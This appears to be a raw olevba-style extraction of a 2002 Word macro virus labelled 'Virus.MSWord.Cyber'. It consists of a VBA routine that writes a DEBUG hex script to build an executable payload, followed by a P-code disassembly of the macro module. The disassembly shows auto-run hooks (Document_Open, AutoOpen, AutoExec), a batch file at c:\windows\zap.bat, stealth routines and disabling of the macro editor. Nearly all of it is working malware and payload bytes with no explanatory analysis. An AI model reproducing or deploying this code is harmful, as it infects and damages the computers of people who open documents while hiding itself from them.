Print #hFile, "E 07E0 30 01 AD 3B C2 74 10 40 96 74 0C 97 33 C0 B9 FF"
Print #hFile, "E 07F0 FF F2 AE 8B F7 EB EB 96 5F 5E 83 ED 02 8B E5 1F"
Print #hFile, "E 0800 5D 4D CA 02 00 8C D8 90 45 55 8B EC 1E 8E D8 57"
Print #hFile, "E 0810 83 3E 9C 00 00 74 1F FF 76 06 0E E8 B0 FF 0B C0"
Print #hFile, "E 0820 74 14 92 8B FA 33 C0 B9 FF FF F2 AE F7 D1 49 8B"
Print #hFile, "E 0830 1E 52 00 E8 55 02 5F 83 ED 02 8B E5 1F 5D 4D CA"
Print #hFile, "E 0840 02 00 55 8B EC 53 06 51 B9 00 10 87 0E 96 00 51"
Print #hFile, "E 0850 50 9A F2 07 E5 00 5B 8F 06 96 00 59 8C DA 0B C0"
Print #hFile, "E 0860 74 04 07 5B EB 05 8B C1 E9 20 FF 8B E5 5D C3 00"
Print #hFile, "E 0870 51 57 F6 47 02 01 74 63 E8 E7 00 8B FE 8B 04 A8"
Print #hFile, "E 0880 01 74 03 2B C8 49 41 41 8B 77 04 0B F6 74 4C 03"
Print #hFile, "E 0890 CE 73 09 33 C0 BA F0 FF E3 30 EB 3F 16 07 26 A1"
Print #hFile, "E 08A0 96 00 3D 00 10 74 16 BA 00 80 3B D0 72 06 D1 EA"
Print #hFile, "E 08B0 75 F8 EB 22 83 FA 08 72 1D D1 E2 8B C2 48 8B D0"
Print #hFile, "E 08C0 03 C1 73 02 33 C0 F7 D2 23 C2 52 E8 2E 00 5A 73"
Print #hFile, "E 08D0 0D 83 FA F0 74 05 B8 10 00 EB E2 F9 EB 1B 8B D0"
Print #hFile, "E 08E0 2B 57 04 89 47 04 89 7F 0A 8B 77 0C 4A 89 14 42"
Print #hFile, "E 08F0 03 F2 C7 04 FE FF 89 77 0C 5F 59 C3 8B D0 F6 47"
Print #hFile, "E 0900 02 04 74 02 EB 51 52 51 53 8B 77 06 2E 8B 1E 10"
Print #hFile, "E 0910 00 33 C9 0B D2 75 07 F7 C3 10 00 75 40 41 B8 02"
Print #hFile, "E 0920 00 F7 C3 01 00 75 03 B8 20 00 56 51 52 50 9A FF"
Print #hFile, "E 0930 FF 00 00 0B C0 74 26 3B C6 75 1C 56 9A FF FF 00"
Print #hFile, "E 0940 00 0B D0 74 12 5B 59 5A 8B C2 F6 47 02 04 74 04"
Print #hFile, "E 0950 4A 89 57 FE F8 EB 0A B8 12 00 E9 2E FE 5B 59 5A"
Print #hFile, "E 0960 F9 C3 57 8B 77 0A 3B 77 0C 75 03 8B 77 08 AD 83"
Print #hFile, "E 0970 F8 FE 74 08 8B FE 24 FE 03 F0 EB F2 4F 4F 8B F7"
Print #hFile, "E 0980 5F C3 45 55 8B EC 1E 8B 46 06 A3 98 00 C7 06 9A"
Print #hFile, "E 0990 00 00 00 8D 66 FE 1F 5D 4D CB 45 55 8B EC 1E B8"
Print #hFile, "E 09A0 FD 43 BA 03 00 52 50 FF 36 9A 00 FF 36 98 00 9A"
Print #hFile, "E 09B0 2E 07 B4 05 05 C3 9E 83 D2 26 A3 98 00 89 16 9A"
Print #hFile, "E 09C0 00 8B C2 80 E4 7F 8D 66 FE 1F 5D 4D CB 90 55 8B"
Print #hFile, "E 09D0 EC 8B 46 08 8B 4E 0C 0B C8 8B 4E 0A 75 09 8B 46"
Print #hFile, "E 09E0 06 F7 E1 5D CA 08 00 53 F7 E1 8B D8 8B 46 06 F7"
Print #hFile, "E 09F0 66 0C 03 D8 8B 46 06 F7 E1 03 D3 5B 5D CA 08 00"
Print #hFile, "E 0A00 55 8B EC 33 C0 8B 4E 0E E3 79 1E 57 56 C5 76 06"
Print #hFile, "E 0A10 C4 7E 0A 8B C1 48 8B D7 F7 D2 2B C2 1B DB 23 C3"
Print #hFile, "E 0A20 03 C2 8B D6 F7 D2 2B C2 1B DB 23 C3 03 C2 40 91"
Print #hFile, "E 0A30 2B C1 92 AC 26 8A 25 3A E0 75 1F 47 E2 F5 92 91"
Print #hFile, "E 0A40 E3 3E 0B F6 75 07 8C D8 05 FF FF 8E D8 0B FF 75"
Print #hFile, "E 0A50 C2 8C C0 05 A9 07 8E C0 EB B9 2C 41 3C 1A 1A DB"
Print #hFile, "E 0A60 80 E3 20 02 C3 04 41 80 EC 41 80 FC 1A 1A DB 80"
Print #hFile, "E 0A70 E3 20 02 E3 80 C4 41 3A C4 74 C0 1B C0 83 D8 FF"
Print #hFile, "E 0A80 5E 5F 1F 5D CB 00 55 8B EC 5D C3 B8 14 00 E9 FA"
Print #hFile, "E 0A90 FC 00 45 55 8B EC 1E 83 EC 02 83 7E 06 00 75 05"
Print #hFile, "E 0AA0 C7 46 06 01 00 B8 FF FF 50 9A 9F 08 00 00 B8 20"
Print #hFile, "E 0AB0 00 50 FF 76 06 9A FF FF 00 00 89 46 FC B8 FF FF"
Print #hFile, "E 0AC0 50 9A C7 08 00 00 83 7E FC 00 75 17 A1 A0 00 0B"
Print #hFile, "E 0AD0 06 9E 00 74 0E FF 76 06 FF 1E 9E 00 83 C4 02 0B"
Print #hFile, "E 0AE0 C0 75 C2 8B 46 FC 8D 66 FE 1F 5D 4D CB 90 45 55"
Print #hFile, "E 0AF0 8B EC 1E 83 7E 06 00 74 08 FF 76 06 9A FF FF 00"
Print #hFile, "E 0B00 00 8D 66 FE 1F 5D 4D CB 45 55 8B EC 1E 83 EC 04"
Print #hFile, "E 0B10 83 7E 06 00 75 0E FF 76 08 9A F2 07 90 08 83 C4"
Print #hFile, "E 0B20 02 EB 4B 90 83 7E 08 00 75 10 FF 76 06 9A 4E 08"
Print #hFile, "E 0B30 12 07 83 C4 02 33 C0 EB 35 90 B8 FF FF 50 9A FF"
Print #hFile, "E 0B40 FF 00 00 FF 76 06 83 7E 08 00 74 06 8B 46 08 EB"
Print #hFile, "E 0B50 04 90 B8 01 00 50 B8 62 00 50 9A FF FF 00 00 89"
Print #hFile, "E 0B60 46 FC B8 FF FF 50 9A FF FF 00 00 8B 46 FC 8D 66"
Print #hFile, "E 0B70 FE 1F 5D 4D CB 90 45 55 8B EC 1E FF 76 06 9A FF"
Print #hFile, "E 0B80 FF 00 00 8D 66 FE 1F 5D 4D CB 00 00 00 00 00 00"
Print #hFile, "E 0B90 C8 02 00 00 56 83 7E 0C 00 74 19 9A FF FF 00 00"
Print #hFile, "E 0BA0 50 1E 68 A8 00 1E 68 A2 00 6A 10 9A FF FF 00 00"
Print #hFile, "E 0BB0 33 C0 EB 30 8B 76 FE FF 76 06 FF 76 0A FF 76 08"
Print #hFile, "E 0BC0 FF 76 0C FF 76 0E 9A 4A 09 38 09 83 C4 0A 0B C0"
Print #hFile, "E 0BD0 74 10 FF 76 0E 9A E4 09 40 09 5B 8B F0 9A 14 0A"
Print #hFile, "E 0BE0 FF FF 8B C6 5E C9 CA 0A 00 00 C8 1A 00 00 56 8B"
Print #hFile, "E 0BF0 76 06 83 7E 08 00 75 4F C7 46 E6 00 00 C7 46 E8"
Print #hFile, "E 0C00 16 0A C7 46 EA 29 09 33 C0 89 46 EC 89 46 EE 89"
Print #hFile, "E 0C10 76 F0 56 1E 68 C2 00 9A FF FF 00 00 89 46 F2 C7"
Print #hFile, "E 0C20 46 F4 00 00 C7 46 F6 02 00 2B C0 89 46 FA 89 46"
Print #hFile, "E 0C30 F8 C7 46 FC CC 00 8C 5E FE 8D 46 E6 16 50 9A FF"
Print #hFile, "E 0C40 FF 00 00 0B C0 74 39 1E 68 CC 00 1E 68 DA 00 68"
Print #hFile, "E 0C50 08 20 6A 00 68 00 80 68 00 80 68 00 80 68 00 80"
Print #hFile, "E 0C60 6A 00 6A 00 56 6A 00 6A 00 9A FF FF 00 00 A3 92"
Print #hFile, "E 0C70 02 89 36 90 02 50 6A 07 9A FF FF 00 00 A1 92 02"
Print #hFile, "E 0C80 5E C9 CB 00 C8 12 00 00 EB 14 8D 46 EE 16 50 9A"
Print #hFile, "E 0C90 FF FF 00 00 8D 46 EE 16 50 9A FF FF 00 00 8D 46"
Print #hFile, "E 0CA0 EE 16 50 6A 00 6A 00 6A 00 9A FF FF 00 00 0B C0"
Print #hFile, "E 0CB0 75 D8 C9 CB CB 00 C8 14 00 00 57 56 8B 46 0C 48"
Print #hFile, "E 0CC0 74 2D 48 75 03 E9 AC 00 2D 11 00 75 03 E9 DE 00"
Print #hFile, "E 0CD0 2D 00 01 75 03 E9 BD 00 FF 76 0E FF 76 0C FF 76"
Print #hFile, "E 0CE0 0A FF 76 08 FF 76 06 9A FF FF 00 00 E9 C2 00 8B"
Print #hFile, "E 0CF0 76 0E 6A 00 9A 5F 0A 00 00 A3 7A 02 6A 01 9A FF"
Print #hFile, "E 0D00 FF 00 00 A3 7C 02 56 68 4C 04 1E 68 A2 00 1E 68"
Print #hFile, "E 0D10 E8 00 6A 1E 9A FF FF 00 00 8B F8 50 6A 00 6A 00"
Print #hFile, "E 0D20 9A FF FF 00 00 57 1E 68 EE 00 8D 46 EC 16 50 9A"
Print #hFile, "E 0D30 FF FF 00 00 83 C4 0A 1E 68 A2 00 1E 68 E8 00 8D"
Print #hFile, "E 0D40 46 EC 16 50 9A B6 0A 00 00 1E 68 A2 00 1E 68 0A"
Print #hFile, "E 0D50 01 1E 68 F2 00 9A FF FF 00 00 68 65 09 68 18 0B"
Print #hFile, "E 0D60 FF 36 90 02 9A FF FF 00 00 A3 7E 02 89 16 80 02"
Print #hFile, "E 0D70 56 E9 67 FF FF 36 80 02 FF 36 7E 02 9A FF FF 00"
Print #hFile, "E 0D80 00 FF 76 0E 68 4C 04 9A FF FF 00 00 6A 00 9A FF"
Print #hFile, "E 0D90 FF 00 00 EB 19 8B 46 0A 2D 4C 04 75 11 FF 36 80"
Print #hFile, "E 0DA0 02 FF 36 7E 02 6A 00 6A 00 9A FF FF 00 00 33 C0"
Print #hFile, "E 0DB0 99 5E 5F C9 CA 0A 00 00 C8 26 00 00 57 56 8B 76"
Print #hFile, "E 0DC0 0A 56 8D 46 DA 16 50 6A 13 9A FF FF 00 00 6A 06"
Print #hFile, "E 0DD0 1E 68 12 01 8D 46 DA 16 50 9A 60 07 A8 0B 83 C4"
Print #hFile, "E 0DE0 0A 0B C0 74 1E 56 9A FF FF 00 00 0B C0 75 14 56"
Print #hFile, "E 0DF0 9A FF FF 00 00 0B C0 74 0A 56 9A FF FF 00 00 0B"
Print #hFile, "E 0E00 C0 75 03 E9 CA 00 56 8D 46 EE 16 50 9A FF FF 00"
Print #hFile, "E 0E10 00 8B 46 F2 8B 7E EE 2B C7 89 46 FC 8B 46 F0 89"
Print #hFile, "E 0E20 46 FE 2B 46 F4 F7 D8 89 46 FA 0B FF 7F 07 C7 46"
Print #hFile, "E 0E30 F6 01 00 EB 29 8B 46 FC 03 C7 3B 06 7A 02 7C 05"
Print #hFile, "E 0E40 B8 FF FF EB 16 9A FA 06 DF 0B 2D FF 3F 0B C0 7E"
Print #hFile, "E 0E50 05 B8 01 00 EB 02 33 C0 03 C0 48 89 46 F6 83 7E"
Print #hFile, "E 0E60 FE 00 7F 07 C7 46 F8 01 00 EB 2A 8B 46 FA 03 46"
Print #hFile, "E 0E70 FE 3B 06 7C 02 7C 05 B8 FF FF EB 16 9A FA 06 F8"
Print #hFile, "E 0E80 0B 2D FF 3F 0B C0 7E 05 B8 01 00 EB 02 33 C0 03"
Print #hFile, "E 0E90 C0 48 89 46 F8 9A FA 06 0F 0C 8B C8 81 C1 E8 03"
Print #hFile, "E 0EA0 69 46 F6 30 75 99 F7 F9 03 F8 56 57 9A FA 06 BB"
Print #hFile, "E 0EB0 0A 8B C8 81 C1 E8 03 69 46 F8 30 75 99 F7 F9 03"
Print #hFile, "E 0EC0 46 FE 50 FF 76 FC FF 76 FA 6A 01 9A FF FF 00 00"
Print #hFile, "E 0ED0 B8 FF FF 5E 5F C9 CA 06 00 2E 00 03 01 F0 09 02"
Print #hFile, "E 0EE0 00 71 00 03 01 FA 09 02 00 72 00 02 00 7C 08 01"
Print #hFile, "E 0EF0 00 00 00 03 01 29 05 01 00 01 00 03 01 49 00 01"
Print #hFile, "E 0F00 00 03 00 03 01 62 04 01 00 83 00 03 01 16 08 01"
Print #hFile, "E 0F10 00 05 00 03 01 BB 08 01 00 06 00 03 01 5D 08 01"
Print #hFile, "E 0F20 00 07 00 03 01 0C 09 02 00 01 00 03 01 20 05 01"
Print #hFile, "E 0F30 00 89 00 05 01 B4 07 01 00 72 00 03 01 DF 08 01"
Print #hFile, "E 0F40 00 0A 00 03 01 89 00 02 00 05 00 03 01 EF 0A 02"
Print #hFile, "E 0F50 00 06 00 03 01 8F 06 01 00 10 00 03 01 81 0A 02"
Print #hFile, "E 0F60 00 0A 00 03 01 E8 0A 02 00 0C 00 03 01 9D 06 01"
Print #hFile, "E 0F70 00 14 00 03 01 0A 08 01 00 17 00 03 01 22 08 01"
Print #hFile, "E 0F80 00 18 00 03 01 80 00 01 00 1E 00 03 01 FC 08 02"
Print #hFile, "E 0F90 00 17 00 03 01 47 0B 02 00 1F 00 03 01 6D 0B 02"
Print #hFile, "E 0FA0 00 20 00 03 01 5B 0B 02 00 23 00 03 01 90 0A 02"
Print #hFile, "E 0FB0 00 A4 01 03 01 CA 09 02 00 29 00 03 01 F9 02 01"
Print #hFile, "E 0FC0 00 31 00 03 01 D9 09 02 00 2A 00 03 01 C5 0A 01"
Print #hFile, "E 0FD0 00 33 00 03 01 DD 0A 01 00 34 00 03 01 78 09 02"
Print #hFile, "E 0FE0 00 AE 00 03 01 75 0A 01 00 39 00 03 01 51 0B 02"
Print #hFile, "E 0FF0 00 31 00 03 01 A5 0A 01 00 3B 00 03 01 55 0A 02"
Print #hFile, "E 1000 00 B3 00 03 01 0A 0B 02 00 36 00 03 01 2C 0C 02"
Print #hFile, "E 1010 00 38 00 03 01 9F 09 02 00 39 00 03 01 2A 0B 02"
Print #hFile, "E 1020 00 3A 00 05 01 10 00 01 00 B2 00 03 01 1E 00 01"
Print #hFile, "E 1030 00 5B 00 03 01 8C 02 01 00 66 00 03 01 48 0A 02"
Print #hFile, "E 1040 00 6B 00 03 01 0A 0A 02 00 6C 00 00 00 00 00 00"
Print #hFile, "E 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1060 00 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1070 00 00 00 00 00 00 00 00 00 00 00 00 01 00 FF FF"
Print #hFile, "E 1080 00 00 00 00 5F 43 5F 46 49 4C 45 5F 49 4E 46 4F"
Print #hFile, "E 1090 3D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 01"
Print #hFile, "E 10B0 00 00 14 00 14 00 28 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 C1 00 00 00"
Print #hFile, "E 10D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10E0 00 00 00 00 00 00 8A 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10F0 00 00 00 00 00 00 00 10 01 00 00 00 00 00 00 00"
Print #hFile, "E 1100 00 00 41 6C 6F 61 70 00 41 6C 6F 61 70 20 41 70"
Print #hFile, "E 1110 70 20 41 6C 72 65 61 64 79 20 52 75 6E 6E 69 6E"
Print #hFile, "E 1120 67 00 61 6C 6F 61 70 69 63 6F 00 00 41 4C 4F 41"
Print #hFile, "E 1130 50 57 6E 64 43 6C 61 73 73 00 43 79 62 65 72 31"
Print #hFile, "E 1140 32 20 56 69 72 75 73 00 54 69 6D 65 72 00 25 64"
Print #hFile, "E 1150 00 00 20 41 67 75 73 74 69 6E 75 73 20 66 61 78"
Print #hFile, "E 1160 7A 75 20 2D 20 32 30 30 32 00 50 72 6F 6A 65 63"
Print #hFile, "E 1170 74 00 23 33 32 37 37 32 00 00 00 00 00 00 00 00"
Print #hFile, "E 1180 00 00 00 00 00 00 00 00 3C 3C 4E 4D 53 47 3E 3E"
Print #hFile, "E 1190 00 00 52 36 30 30 30 0D 0A 2D 20 73 74 61 63 6B"
Print #hFile, "E 11A0 20 6F 76 65 72 66 6C 6F 77 0D 0A 00 03 00 52 36"
Print #hFile, "E 11B0 30 30 33 0D 0A 2D 20 69 6E 74 65 67 65 72 20 64"
Print #hFile, "E 11C0 69 76 69 64 65 20 62 79 20 30 0D 0A 00 09 00 52"
Print #hFile, "E 11D0 36 30 30 39 0D 0A 2D 20 6E 6F 74 20 65 6E 6F 75"
Print #hFile, "E 11E0 67 68 20 73 70 61 63 65 20 66 6F 72 20 65 6E 76"
Print #hFile, "E 11F0 69 72 6F 6E 6D 65 6E 74 0D 0A 00 12 00 52 36 30"
Print #hFile, "E 1200 31 38 0D 0A 2D 20 75 6E 65 78 70 65 63 74 65 64"
Print #hFile, "E 1210 20 68 65 61 70 20 65 72 72 6F 72 0D 0A 00 14 00"
Print #hFile, "E 1220 52 36 30 32 30 0D 0A 2D 20 75 6E 65 78 70 65 63"
Print #hFile, "E 1230 74 65 64 20 51 75 69 63 6B 57 69 6E 20 65 72 72"
Print #hFile, "E 1240 6F 72 0D 0A 00 08 00 52 36 30 30 38 0D 0A 2D 20"
Print #hFile, "E 1250 6E 6F 74 20 65 6E 6F 75 67 68 20 73 70 61 63 65"
Print #hFile, "E 1260 20 66 6F 72 20 61 72 67 75 6D 65 6E 74 73 0D 0A"
Print #hFile, "E 1270 00 15 00 52 36 30 32 31 0D 0A 2D 20 6E 6F 20 6D"
Print #hFile, "E 1280 61 69 6E 20 70 72 6F 63 65 64 75 72 65 0D 0A 00"
Print #hFile, "E 1290 FC 00 0D 0A 00 FF 00 72 75 6E 2D 74 69 6D 65 20"
Print #hFile, "E 12A0 65 72 72 6F 72 20 00 02 00 52 36 30 30 32 0D 0A"
Print #hFile, "E 12B0 2D 20 66 6C 6F 61 74 69 6E 67 2D 70 6F 69 6E 74"
Print #hFile, "E 12C0 20 73 75 70 70 6F 72 74 20 6E 6F 74 20 6C 6F 61"
Print #hFile, "E 12D0 64 65 64 0D 0A 00 FF FF FF 00 00 00 00 00 00 00"
Print #hFile, "E 12E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 12F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1340 00 00 01 00 01 00 20 20 10 00 01 00 04 00 E8 02"
Print #hFile, "E 1350 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1360 28 00 00 00 20 00 00 00 40 00 00 00 01 00 04 00"
Print #hFile, "E 1370 00 00 00 00 80 02 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00"
Print #hFile, "E 1390 00 80 00 00 00 80 80 00 80 00 00 00 80 00 80 00"
Print #hFile, "E 13A0 80 80 00 00 80 80 80 00 C0 C0 C0 00 00 00 FF 00"
Print #hFile, "E 13B0 00 FF 00 00 00 FF FF 00 FF 00 00 00 FF 00 FF 00"
Print #hFile, "E 13C0 FF FF 00 00 FF FF FF 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 13D0 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 13E0 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 13F0 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
Print #hFile, "E 1400 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
Print #hFile, "E 1410 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
Print #hFile, "E 1420 FF FF FF FF F9 FF FF 00 FF F9 99 9F FF FF FF FF"
Print #hFile, "E 1430 FF FF FF FF 9F 9F FF 00 FF FF FF F9 99 9F FF FF"
Print #hFile, "E 1440 FF FF FF F9 FF F9 FF 00 FF FF FF FF FF 9F FF FF"
Print #hFile, "E 1450 FF FF FF 9F FF FF FF 00 FF FF FF FF FF F9 FF FF"
Print #hFile, "E 1460 FF FF F9 FF FF FF FF 00 FF FF FF FF FF F9 9F FF"
Print #hFile, "E 1470 FF FF F9 FF FF FF FF 00 FF FF FF FF FF FF 9F FF"
Print #hFile, "E 1480 FF FF 99 FF FF FF FF 00 FF FF FF FF FF FF 99 99"
Print #hFile, "E 1490 99 99 9F FF FF FF FF 00 FF FF FF FF FF FF F9 99"
Print #hFile, "E 14A0 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF F9 99"
Print #hFile, "E 14B0 FF FF FF FF FF FF FF 00 FF FF FF 9F FF FF FF 99"
Print #hFile, "E 14C0 9F FF FF F9 FF FF FF 00 FF FF FF F9 FF FF FF F9"
Print #hFile, "E 14D0 9F FF FF 9F 9F FF FF 00 FF FF FF FF 9F FF FF FF"
Print #hFile, "E 14E0 99 FF 99 FF F9 FF FF 00 FF FF FF FF F9 FF FF FF"
Print #hFile, "E 14F0 99 F9 FF FF FF 9F FF 00 FF FF FF FF FF 9F FF FF"
Print #hFile, "E 1500 99 9F FF FF FF FF FF 00 FF FF FF FF FF F9 99 99"
Print #hFile, "E 1510 99 9F FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1520 FF 9F FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1530 FF 99 99 FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1540 FF F9 99 9F FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1550 FF F9 99 99 FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1560 FF FF 99 99 FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1570 FF FF F9 9F FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1580 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 1590 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
Print #hFile, "E 15A0 FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15C0 00 00 00 00 00 00 00 00 FF FF FF FF 00 00 00 03"
Print #hFile, "E 15D0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 15E0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 15F0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1600 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1610 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1620 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1630 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
Print #hFile, "E 1640 FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00"
Print #hFile, "RCX"
Print #hFile, "1550"
Print #hFile, "W"
Print #hFile, "Q"
Close hFile
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cyber
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1123 bytes
' Macros/VBA/War12 - 72717 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0024 "Created       : Cyber12 by Agustinus"
' Line #1:
' 	QuoteRem 0x0000 0x0044 "Modified      : February 2002 it's dedicated to my girl Hani Hanipah"
' Line #2:
' 	QuoteRem 0x0000 0x0045 "---------------------------------------------------------------------"
' Line #3:
' 	Option  (Compare Text)
' Line #4:
' 	Dim 
' 	VarDefn Komp (As Variant)
' Line #5:
' 	Dim (Public Const) 
' 	LitStr 0x000B "Application"
' 	VarDefn regApp (As String)
' Line #6:
' 	Dim (Public Const) 
' 	LitStr 0x0008 "Settings"
' 	VarDefn regSecSet (As String)
' Line #7:
' 	Dim (Public Const) 
' 	LitStr 0x0007 "AppName"
' 	VarDefn regSecApp (As String)
' Line #8:
' 	Dim (Const) 
' 	LitStr 0x0005 "Cyber"
' 	VarDefn TempVer (As String)
' Line #9:
' 	Dim (Const) 
' 	LitStr 0x0003 "War"
' 	VarDefn MacName (As String)
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0002 "12"
' 	VarDefn Ver (As String)
' Line #11:
' 	Dim 
' 	VarDefn ctl (As Variant)
' Line #12:
' 	Dim (Global) 
' 	VarDefn blnFound (As Boolean)
' Line #13:
' 	Dim 
' 	VarDefn CusProp
' Line #14:
' 	Dim 
' 	VarDefn blnMod (As Boolean)
' Line #15:
' 	Dim (Public Const) 
' 	LitStr 0x0008 "01:00:00"
' 	VarDefn TimerOn
' Line #16:
' 	Dim (Const) 
' 	LitDI2 0x0078 
' 	VarDefn Akhir
' Line #17:
' 	Dim 
' 	VarDefn Caption (As String)
' Line #18:
' 	Dim 
' 	VarDefn actWindow
' Line #19:
' 	Dim (Global) 
' 	VarDefn Active
' Line #20:
' 	Dim (Global) 
' 	VarDefn Temp
' Line #21:
' 	Dim (Global) 
' 	VarDefn TempPath
' Line #22:
' 	Dim 
' 	VarDefn Waktu
' Line #23:
' 	Dim 
' 	VarDefn Bar (As Integer)
' Line #24:
' 	Dim (Public Const) 
' 	LitStr 0x0013 "HKEY_LOCAL_MACHINE\"
' 	VarDefn hklm
' 	LitStr 0x0012 "HKEY_CURRENT_USER\"
' 	VarDefn hkcu
' 	LitStr 0x0013 "SOFTWARE\Microsoft\"
' 	VarDefn SOM
' 	LitStr 0x0013 "Software\Microsoft\"
' 	VarDefn sm
' 	LitStr 0x0017 "Windows\CurrentVersion\"
' 	VarDefn cv
' 	LitStr 0x001A "MS Setup (ACME)\User Info\"
' 	VarDefn ACME
' Line #25:
' 	Dim (Public Const) 
' 	LitStr 0x001A "http://www.faxzu.vcom.net "
' 	VarDefn faxzu
' Line #26:
' Line #27:
' 	FuncDefn (Private Sub Document_Open())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	LitStr 0x0012 "c:\windows\zap.bat"
' 	ArgsCall (Call) zap 0x0001 
' Line #30:
' 	ArgsCall Stealth 0x0000 
' Line #31:
' 	ArgsCall Hidden 0x0000 
' Line #32:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' 	FuncDefn (Sub Autoexec())
' Line #36:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #38:
' 	LitStr 0x0012 "c:\windows\zap.bat"
' 	ArgsCall (Call) zap 0x0001 
' Line #39:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #40:
' 	ArgsCall Damt 0x0000 
' Line #41:
' 	ArgsCall Stealth 0x0000 
' Line #42:
' 	ArgsCall MenuWord 0x0000 
' Line #43:
' 	Ld Now 
' 	Ld TimerOn 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "OnTimer"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #44:
' 	ArgsCall Damf 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' 	FuncDefn (Sub AutoOpen())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	Dim 
' 	VarDefn strRun (As String)
' Line #50:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #51:
' 	LitStr 0x0012 "c:\windows\zap.bat"
' 	ArgsCall (Call) zap 0x0001 
' Line #52:
' 	Ld PWords 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #53:
' 	ArgsCall Damt 0x0000 
' Line #54:
' 	ArgsCall ActiveTemp 0x0000 
' Line #55:
' 	ArgsCall Stealth 0x0000 
' Line #56:
' 	ArgsCall MenuWord 0x0000 
' Line #57:
' 	Ld blnFound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld MacName 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0008 ".FoundIt"
' 	Concat 
' 	St strRun 
' Line #59:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	Ld strRun 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	ArgsCall Damf 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Sub AutoNew())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	ArgsCall TempActive 0x0000 
' Line #67:
